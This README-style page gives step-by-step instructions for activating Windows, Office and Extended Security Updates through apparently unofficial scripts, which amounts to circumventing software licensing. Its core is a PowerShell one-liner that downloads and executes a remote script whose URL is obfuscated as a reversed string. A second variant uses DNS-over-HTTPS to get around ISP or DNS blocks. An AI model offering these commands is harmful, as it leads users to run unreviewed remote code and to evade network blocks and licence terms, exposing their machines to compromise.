## How to Activate Windows / Office / Extended Security Updates (ESU)?

### Method 1 - PowerShell ❤️

1. Click the **Start Menu**, type `PowerShell`, and open it.

2. Copy and paste the code below and press **Enter.**  
   - For **Windows 8.1, 10 and 11**:
     ```
     iex(irm(-join"x/dilavni.elpmaxe//:sptth"[-1..-99]))
     ```
	 If the above is blocked (by ISP/DNS), try this (needs updated Windows 10 or 11):  
	 ```
	 iex (curl.exe -s --doh-url https://example.invalid/dns-query (-join"x/dilavni.elpmaxe//:sptth"[-1..-99]) | Out-String)
	 ```

3. In the menu that appears, type the number corresponding to one of the **Green** options.

> [!TIP]
> - Some ISPs/DNS providers block access to our domains. You can bypass this by enabling [DNS-over-HTTPS (DoH)](https://example.invalid/) in your browser. 
> - **Having trouble**? Visit our [troubleshooting page](https://example.invalid/) or raise an issue on [GitHub](https://example.invalid/).

> [!NOTE]
>
> - The `irm` command in PowerShell downloads a script from a specified URL, and the `iex` command executes it.
> - Always double-check the URL before executing the command and verify the source is trustworthy when manually downloading files.
> - Be cautious of third parties spreading malware disguised as MAS by altering the URL in the PowerShell command.
